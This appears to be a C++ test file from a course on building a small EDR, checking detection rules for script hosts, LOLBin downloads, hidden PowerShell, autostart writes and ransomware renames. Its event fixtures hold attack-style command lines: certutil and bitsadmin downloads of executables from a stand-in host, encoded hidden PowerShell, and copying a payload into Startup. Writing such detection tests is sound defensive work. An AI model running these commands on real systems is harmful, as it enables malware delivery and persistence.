// Тесты правил на событиях из журналов. Занятие 1.3.
//
// События здесь лежат уже разобранными. Так тест проверяет таблицу правил,
// а не разбор строки: если правило не сработало, причина в правиле, и искать
// её в парсере не нужно.
//
// Наборы повторяют журналы из scenarios/ — не целиком, а теми событиями,
// на которых видно, работает правило или нет: сработавшими и теми, на которых
// сработать не должно. Вторых не меньше, чем первых, и они важнее: правило,
// которое срабатывает на всём подряд, бесполезно ровно так же, как правило,
// которое не срабатывает никогда.
//
// Таблица берётся через AgentRules() и AgentRuleCount() из заготовки
// agent_rules.h: где лежит ваш файл с правилами, тест не знает и знать
// не должен.
//
// CheckRules печатает детекты сама, поэтому в выводе прогона будут строки
// [DETECT]. Так и должно быть.

#include <cstddef>
#include <stdexcept>
#include <string>
#include <vector>

#include "agent_rules.h"
#include "doctest.h"
#include "event.h"
#include "rules.h"

using nano_edr::AgentRuleCount;
using nano_edr::AgentRules;
using nano_edr::CheckRules;
using nano_edr::Event;
using nano_edr::Field;

namespace {

Event Make(const std::string& ts, const std::string& type,
           const std::string& pid, const std::vector<Field>& fields) {
    Event event;
    event.ts = ts;
    event.type = type;
    event.pid = pid;
    event.fields = fields;
    return event;
}

std::size_t Detects(const Event& event) {
    return CheckRules(event, AgentRules(), AgentRuleCount());
}

// Короткие построители для случаев, где важно одно-два поля.
Event ProcessStart(const std::string& image, const std::string& cmdline) {
    return Make("1730900000000", "process_start", "7000",
                {{"ppid", "880"}, {"image", image}, {"cmdline", cmdline}});
}

Event FileEvent(const std::string& type, const std::string& key,
                const std::string& path) {
    return Make("1730900000000", type, "7000", {{key, path}});
}

// Путь автозагрузки Windows целиком: он длинный, повторяется в четырёх
// случаях ниже, и в нём важен каждый сегмент — правило обязано смотреть
// на канонический \start menu\programs\startup\, а не на \startup\.
const char kStartupLnk[] =
    R"(C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu)"
    R"(\Programs\Startup\Sync.lnk)";

// Правило ищется по идентификатору: порядок в таблице ваш.
const nano_edr::Rule* FindRule(const std::string& id) {
    const nano_edr::Rule* rules = AgentRules();
    for (std::size_t i = 0; i < AgentRuleCount(); ++i) {
        if (rules[i].id != nullptr && id == rules[i].id) {
            return &rules[i];
        }
    }
    return nullptr;
}

std::size_t Detects(const std::vector<Event>& events) {
    std::size_t total = 0;
    for (const Event& event : events) {
        total += CheckRules(event, AgentRules(), AgentRuleCount());
    }
    return total;
}

// ---------------------------------------------------------------------------
// События, на которых правила ошибаются чаще всего
// ---------------------------------------------------------------------------

// Word держит шаблоны в ...\Microsoft\Word\STARTUP\ и пишет туда свои
// временные файлы. Правило автозапуска по подстроке «startup» срабатывает
// здесь — и это ложный детект: до папки автозагрузки Windows этот путь
// отношения не имеет.
Event WordStartupWrite() {
    return Make(
        "1730000002100", "file_write", "880",
        {{"path",
          R"(C:\Users\max\AppData\Roaming\Microsoft\Word\STARTUP)"
          R"(\~$report.docx)"},
         {"size", "162"}});
}

// В командной строке стоит wscript, но образ процесса — cmd.exe. Правило
// про скриптовый хост смотрит на образ, а не на текст команды.
Event CmdRunningWscript() {
    return Make("1730000001000", "process_start", "1042",
                {{"ppid", "880"},
                 {"image", R"(C:\Windows\System32\cmd.exe)"},
                 {"cmdline", R"(cmd /c wscript %TEMP%\a.js)"},
                 {"user", R"(DESKTOP\max)"}});
}

// То же самое для загрузки: certutil упомянут в команде оболочки, но запущен
// здесь не он.
Event CmdRunningCertutil() {
    return Make(
        "1730200000000", "process_start", "3310",
        {{"ppid", "880"},
         {"image", R"(C:\Windows\System32\cmd.exe)"},
         {"cmdline",
          R"(cmd /c certutil -urlcache -split -f )"
          R"(http://cdn.example.net/upd.txt %TEMP%\upd.exe)"},
         {"user", R"(DESKTOP\max)"}});
}

// Скриптовый хост запущен законно: скрипт лежит в корпоративном каталоге,
// а не во временном. Ровно этим clean_office и отличается от phishing_macro,
// и в тексте строки различия нет — оно в поле.
Event WscriptFromCorpTools() {
    return Make("1730500006400", "process_start", "1850",
                {{"ppid", "880"},
                 {"image", R"(C:\Windows\System32\wscript.exe)"},
                 {"cmdline", R"(wscript.exe C:\corp\tools\map_drives.vbs)"},
                 {"user", R"(DESKTOP\max)"}});
}

// ---------------------------------------------------------------------------
// Наборы событий
// ---------------------------------------------------------------------------

std::vector<Event> PhishingMacro() {
    return {
        Make("1730000000500", "file_write", "1300",
             {{"path",
               R"(C:\Users\max\AppData\Local\Google\Chrome\User )"
               R"(Data\Default\History)"},
              {"size", "204800"}}),
        CmdRunningWscript(),
        Make("1730000001400", "file_create", "1042",
             {{"path", R"(C:\Users\max\AppData\Local\Temp\a.js)"}}),
        WordStartupWrite(),
        Make("1730000003000", "process_start", "1101",
             {{"ppid", "1042"},
              {"image", R"(C:\Windows\System32\wscript.exe)"},
              {"cmdline",
               R"(wscript.exe C:\Users\max\AppData\Local\Temp\a.js)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730000004200", "net_connect", "1101",
             {{"raddr", "185.12.3.4"},
              {"rport", "443"},
              {"domain", "evil.example"}}),
        Make("1730000006000", "process_start", "1156",
             {{"ppid", "1101"},
              {"image",
               R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)"},
              {"cmdline", R"(powershell -w hidden -enc SQBFAFgA)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730000005300", "file_write", "1101",
             {{"path", R"(C:\Users\max\AppData\Local\Temp\stage2.bin)"},
              {"size", "48128"}}),
    };
}

std::vector<Event> LolbinDownload() {
    return {
        CmdRunningCertutil(),
        Make("1730200000500", "process_start", "3315",
             {{"ppid", "3310"},
              {"image", R"(C:\Windows\System32\certutil.exe)"},
              {"cmdline",
               R"(certutil -urlcache -split -f http://cdn.example.net/upd.txt )"
               R"(C:\Users\max\AppData\Local\Temp\upd.exe)"}}),
        Make("1730200000900", "net_connect", "3315",
             {{"raddr", "91.204.11.7"},
              {"rport", "80"},
              {"domain", "cdn.example.net"}}),
        Make("1730200001500", "file_create", "3315",
             {{"path", R"(C:\Users\max\AppData\Local\Temp\upd.exe)"}}),
    };
}

std::vector<Event> Persistence() {
    return {
        Make("1730300000000", "process_start", "4410",
             {{"ppid", "880"},
              {"image",
               R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)"},
              {"cmdline",
               R"(powershell -w hidden -c Copy-Item $env:TEMP\s.bin )"
               R"($env:APPDATA\Sync\sync.exe)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730300000600", "file_create", "4410",
             {{"path", R"(C:\Users\max\AppData\Roaming\Sync\sync.exe)"}}),
        Make("1730300001600", "file_create", "4410",
             {{"path",
               kStartupLnk}}),
        Make("1730300001900", "file_write", "4410",
             {{"path",
               kStartupLnk},
              {"size", "1246"}}),
        Make("1730300003000", "process_start", "4455",
             {{"ppid", "880"},
              {"image", R"(C:\Users\max\AppData\Roaming\Sync\sync.exe)"},
              {"cmdline", R"(sync.exe --service)"},
              {"user", R"(DESKTOP\max)"}}),
    };
}

std::vector<Event> Ransomware() {
    return {
        Make("1730100000000", "process_start", "2210",
             {{"ppid", "880"},
              {"image", R"(C:\Users\max\AppData\Local\Temp\svchost.exe)"},
              {"cmdline", R"(svchost.exe -e -q)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730100001000", "file_write", "2210",
             {{"path", R"(C:\Users\max\Documents\quarterly.xlsx)"},
              {"size", "4096"}}),
        Make("1730100001060", "file_move", "2210",
             {{"from", R"(C:\Users\max\Documents\quarterly.xlsx)"},
              {"to", R"(C:\Users\max\Documents\quarterly.xlsx.locked)"}}),
        Make("1730100001150", "file_write", "2210",
             {{"path", R"(C:\Users\max\Documents\contract.docx)"},
              {"size", "4193"}}),
        Make("1730100001210", "file_move", "2210",
             {{"from", R"(C:\Users\max\Documents\contract.docx)"},
              {"to", R"(C:\Users\max\Documents\contract.docx.locked)"}}),
    };
}

std::vector<Event> PidReuse() {
    return {
        Make("1730400000000", "process_start", "1042",
             {{"ppid", "880"},
              {"image", R"(C:\Windows\System32\wscript.exe)"},
              {"cmdline",
               R"(wscript.exe C:\Users\max\AppData\Local\Temp\b.js)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730400000600", "process_start", "1180",
             {{"ppid", "1042"},
              {"image",
               R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)"},
              {"cmdline", R"(powershell -w hidden -enc SQBFAFgA)"},
              {"user", R"(DESKTOP\max)"}}),
        Make("1730400001800", "process_end", "1042", {{"exit", "0"}}),
        // Номер завершившегося процесса достался безобидному notepad.
        Make("1730400002000", "process_start", "1042",
             {{"ppid", "880"},
              {"image", R"(C:\Windows\System32\notepad.exe)"},
              {"cmdline", R"(notepad.exe C:\Users\max\notes.txt)"},
              {"user", R"(DESKTOP\max)"}}),
    };
}

std::vector<Event> CleanOffice() {
    return {
        Make("1730500000000", "file_write", "1500",
             {{"path", R"(C:\Users\max\report.docx)"}, {"size", "21504"}}),
        Make("1730500000400", "file_write", "1500",
             {{"path",
               R"(C:\Users\max\AppData\Roaming\Microsoft\Word\AutoRecovery )"
               R"(save of report.asd)"},
              {"size", "20480"}}),
        WscriptFromCorpTools(),
        Make("1730500003520", "file_create", "1300",
             {{"path",
               R"(C:\Users\max\AppData\Local\Google\Chrome\User )"
               R"(Data\Default\Cache\data_1)"}}),
        Make("1730500009800", "file_move", "880",
             {{"from", R"(C:\Users\max\report.docx)"},
              {"to", R"(C:\Users\max\report_final.docx)"}}),
    };
}

std::vector<Event> CleanBuild() {
    return {
        Make("1730600000800", "process_start", "5600",
             {{"ppid", "5520"},
              {"image",
               R"(C:\Program Files\Microsoft Visual )"
               R"(Studio\2022\Community\VC\Tools\MSVC\14.44\bin\Hostx64\x64\)"
               R"(cl.exe)"},
              {"cmdline",
               R"(cl.exe /c /std:c++latest src\api.cpp )"
               R"(/FoC:\work\nano-edr\build\obj\api.obj.tmp)"}}),
        Make("1730600000840", "file_create", "5600",
             {{"path", R"(C:\work\nano-edr\build\obj\api.obj.tmp)"}}),
        Make("1730600000880", "file_write", "5600",
             {{"path", R"(C:\work\nano-edr\build\obj\api.obj.tmp)"},
              {"size", "40960"}}),
        Make("1730600000910", "file_move", "5600",
             {{"from", R"(C:\work\nano-edr\build\obj\api.obj.tmp)"},
              {"to", R"(C:\work\nano-edr\build\obj\api.obj)"}}),
        Make("1730600001060", "file_move", "5601",
             {{"from", R"(C:\work\nano-edr\build\obj\actions.obj.tmp)"},
              {"to", R"(C:\work\nano-edr\build\obj\actions.obj)"}}),
    };
}

}  // namespace

// ---------------------------------------------------------------------------
// Таблица целиком
// ---------------------------------------------------------------------------

TEST_CASE("в таблице пять правил") {
    CHECK(AgentRuleCount() == 5);
    REQUIRE(AgentRules() != nullptr);
}

TEST_CASE("идентификаторы и важности — те, что заданы") {
    struct Expected {
        const char* id;
        nano_edr::Severity severity;
    };

    const Expected expected[] = {
        {"script_host_from_temp", nano_edr::Severity::kHigh},
        {"lolbin_download", nano_edr::Severity::kHigh},
        {"hidden_powershell", nano_edr::Severity::kMedium},
        {"autostart_write", nano_edr::Severity::kHigh},
        {"ransom_extension", nano_edr::Severity::kCritical},
    };

    for (const Expected& want : expected) {
        INFO("правило: ", want.id);
        const nano_edr::Rule* rule = FindRule(want.id);
        REQUIRE(rule != nullptr);
        CHECK(rule->severity == want.severity);
    }
}

// ---------------------------------------------------------------------------
// Журналы с атакой
// ---------------------------------------------------------------------------

TEST_CASE("phishing_macro: скриптовый хост из Temp и скрытый powershell") {
    CHECK(Detects(PhishingMacro()) == 2);
}

TEST_CASE("lolbin_download: одна загрузка штатной утилитой") {
    CHECK(Detects(LolbinDownload()) == 1);
}

TEST_CASE("persistence: скрытый powershell и две записи в автозапуск") {
    CHECK(Detects(Persistence()) == 3);
}

TEST_CASE("ransomware: детект на каждое переименование в .locked") {
    CHECK(Detects(Ransomware()) == 2);
}

TEST_CASE("pid_reuse: повторно выданный номер лишних детектов не даёт") {
    CHECK(Detects(PidReuse()) == 2);
}

// ---------------------------------------------------------------------------
// Журналы без атаки
// ---------------------------------------------------------------------------

TEST_CASE("clean_office: ноль детектов") {
    CHECK(Detects(CleanOffice()) == 0);
}

TEST_CASE("clean_build: ноль детектов") {
    CHECK(Detects(CleanBuild()) == 0);
}

// ---------------------------------------------------------------------------
// Отдельные события, на которых правила ошибаются
// ---------------------------------------------------------------------------

TEST_CASE("временный файл Word в STARTUP — не автозапуск") {
    CHECK(Detects(WordStartupWrite()) == 0);
}

TEST_CASE("образ процесса важнее текста команды") {
    CHECK(Detects(CmdRunningWscript()) == 0);
    CHECK(Detects(CmdRunningCertutil()) == 0);
}

TEST_CASE("скриптовый хост из корпоративного каталога — не детект") {
    CHECK(Detects(WscriptFromCorpTools()) == 0);
}

// ---------------------------------------------------------------------------
// Границы спецификации: по одному событию на случай
// ---------------------------------------------------------------------------

TEST_CASE("скриптовый хост: оба образа и оба временных каталога") {
    CHECK(Detects(ProcessStart(
              R"(C:\Windows\System32\cscript.exe)",
              R"(cscript.exe C:\Users\max\AppData\Local\Temp\a.js)")) == 1);
    CHECK(Detects(ProcessStart(R"(C:\Windows\System32\wscript.exe)",
                               R"(wscript.exe C:\Windows\Temp\x.js)")) == 1);
}

TEST_CASE("скриптовый хост: %TEMP% в командной строке не раскрыт") {
    // Так эта строка и приходит в журнале: переменную раскрывает
    // NormalizePath, а не оболочка.
    CHECK(Detects(ProcessStart(R"(C:\Windows\System32\wscript.exe)",
                               R"(wscript.exe %TEMP%\a.js)")) == 1);
}

TEST_CASE("скриптовый хост: регистр и прямые слеши ничего не меняют") {
    CHECK(Detects(ProcessStart(
              R"(C:/WINDOWS/SYSTEM32/WSCRIPT.EXE)",
              R"(WSCRIPT.EXE C:/USERS/MAX/APPDATA/LOCAL/TEMP/A.JS)")) == 1);
}

TEST_CASE("скриптовый хост без командной строки — не детект, а не падение") {
    const Event event = Make("1730900000000", "process_start", "7000",
                             {{"image", R"(C:\Windows\System32\wscript.exe)"}});

    CHECK(Detects(event) == 0);
}

TEST_CASE("загрузка: bitsadmin с transfer") {
    CHECK(Detects(ProcessStart(
              R"(C:\Windows\System32\bitsadmin.exe)",
              R"(bitsadmin /transfer job http://cdn.example.net/y.exe )"
              R"(C:\Users\max\AppData\Local\Temp\y.exe)")) ==
          1);
}

TEST_CASE("загрузка: certutil без сети запускают и по делу") {
    CHECK(Detects(ProcessStart(
              R"(C:\Windows\System32\certutil.exe)",
              R"(certutil -decode C:\work\a.txt C:\work\a.bin)")) == 0);
}

TEST_CASE("скрытый powershell: pwsh и длинные формы ключей") {
    CHECK(Detects(ProcessStart(
              R"(C:\Program Files\PowerShell\7\pwsh.exe)",
              R"(pwsh -windowstyle hidden -encodedcommand SQBFAFgA)")) == 1);
}

TEST_CASE("powershell без скрытых ключей — не детект") {
    CHECK(Detects(ProcessStart(
              R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)",
              R"(powershell -File C:\corp\tools\update.ps1)")) == 0);
}

TEST_CASE("автозапуск: переименование в Startup видно только в поле to") {
    const Event event = Make(
        "1730900000000", "file_move", "7000",
        {{"from", R"(C:\Users\max\AppData\Local\Temp\Sync.lnk)"},
         {"to",
          kStartupLnk}});

    CHECK(Detects(event) == 1);
}

TEST_CASE("автозапуск: удаление из Startup — не запись") {
    CHECK(Detects(FileEvent(
              "file_delete", "path",
              kStartupLnk)) ==
          0);
}

TEST_CASE("шифровальщик: .locked не только у переименования") {
    CHECK(Detects(FileEvent(
              "file_write", "path",
              R"(C:\Users\max\Documents\quarterly.xlsx.locked)")) == 1);
}

TEST_CASE("шифровальщик: .locked посреди имени — не детект") {
    // Правило про окончание имени, а не про вхождение подстроки.
    CHECK(Detects(FileEvent(
              "file_write", "path",
              R"(C:\Users\max\Documents\report.locked.docx)")) == 0);
}

TEST_CASE("шифровальщик: регистр расширения не спасает") {
    const Event event =
        Make("1730900000000", "file_move", "7000",
             {{"from", R"(C:\Users\max\Documents\report.docx)"},
              {"to", R"(C:\Users\max\Documents\report.docx.LOCKED)"}});

    CHECK(Detects(event) == 1);
}

TEST_CASE("старт процесса без image обрывает прогон") {
    // Образ обязателен: правило про образ на таком событии не проверить,
    // и GetRequiredField бросает. Исключение проходит сквозь CheckRules
    // наружу — ловит его последний рубеж в main.
    const Event event = Make("1730900000000", "process_start", "7000",
                             {{"ppid", "880"},
                              {"cmdline", "wscript.exe a.js"}});

    CHECK_THROWS_AS(Detects(event), std::invalid_argument);
}

TEST_CASE("событие без полей вообще — ноль детектов") {
    CHECK(Detects(Make("1730900000000", "process_end", "7000", {})) == 0);
}
